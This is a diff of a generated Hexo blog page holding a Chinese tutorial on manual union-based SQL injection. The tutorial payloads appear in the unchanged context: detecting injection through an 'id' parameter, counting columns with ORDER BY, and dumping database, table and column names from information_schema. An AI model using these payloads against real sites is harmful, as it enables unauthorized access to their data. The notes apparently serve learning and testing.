@@ -38,7 +38,7 @@
 </script>
 
     <title>SQL注入 - Saltneko</title>
-  </head>
+  <meta name="generator" content="Hexo 4.2.0"></head>
 
   <body><div id="mobile-navbar" class="mobile-navbar">
   <div class="mobile-header-logo">
@@ -118,7 +118,7 @@
   </div><div class="post-content"><h3 id="判断存在注入"><a href="#判断存在注入" class="headerlink" title="#判断存在注入"></a>#判断存在注入</h3><p>1.访问<code>id=1</code><br>2.访问<code>id=1</code>‘，返回内容与1不同<br>3.访问<code>id=1 and 1=1</code>，返回内容与1相同<br>4.访问<code>id=1 and 1=2</code>，返回内容与1不同<br>=》判断存在注入</p>
 <a id="more"></a>
 <h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="#寻找注入点"></a>#寻找注入点</h3><p>5.访问<code>id=1 order by 1(1-99)</code>,直到返回内容与1不同（例：字段数为3）<br>6.访问<code>id=1 union select 1,2,3</code>，返回内容与1相同（代码只返回第一条结果）<br>7.访问<code>id=-1 union select 1,2,3</code>，返回union select结果（例：返回2:3，即2，3间可插入mysql语句）<br>###<br>#库表字段（需记忆）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">库：information_schema</span><br><span class="line">表：SCHEMATA-&gt;SCHEMA_NAME（对应字段）</span><br><span class="line">	TABLES-&gt;TABLE_SCHEMA,TABLE_NAME</span><br><span class="line">    COLUMNS-&gt;TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME</span><br><span class="line">SQL格式：union select 查询字段名 from 库.表 where 已知条件字段名=‘已知条件的值’</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">库：information_schema</span><br><span class="line">表：SCHEMATA-&gt;SCHEMA_NAME（对应字段）</span><br><span class="line">	TABLES-&gt;TABLE_SCHEMA,TABLE_NAME</span><br><span class="line">    COLUMNS-&gt;TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME</span><br><span class="line">SQL格式：union select 查询字段名 from 库.表 where 已知条件字段名&#x3D;‘已知条件的值’</span><br></pre></td></tr></table></figure>
 <h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="#爆数据库名"></a>#爆数据库名</h3><p>8.访问<code>id=-1 union select 1,database(),3</code>（例：返回sql）</p>
 <h3 id="爆数据表名"><a href="#爆数据表名" class="headerlink" title="#爆数据表名"></a>#爆数据表名</h3><p>9.访问<code>id=-1 union select 1,(select table_name from information_schema.table where table_schema=&#39;sql&#39; limit 0,1),3</code>（例：返回email，调试[limit1,1]返回referers)</p>
 <h3 id="爆字段名"><a href="#爆字段名" class="headerlink" title="#爆字段名"></a>#爆字段名</h3><p>10.访问<code>id=-1 union select 1,(select column_name from information_schema.columns from where table_schema=&#39;sql&#39; and table_name=&#39;emails&#39; limit 0,1),3</code>（例：返回id)</p>
@@ -146,7 +146,7 @@
 </div>
       </main>
 
-      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:1281714262@qq.com" target="_blank" rel="noopener" class="iconfont icon-email" title="email"></a>
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:1281714262@qq.com" class="iconfont icon-email" title="email"></a>
         <a href="https://github.com/SaLTNEko" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
         <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
     </div><div class="copyright">
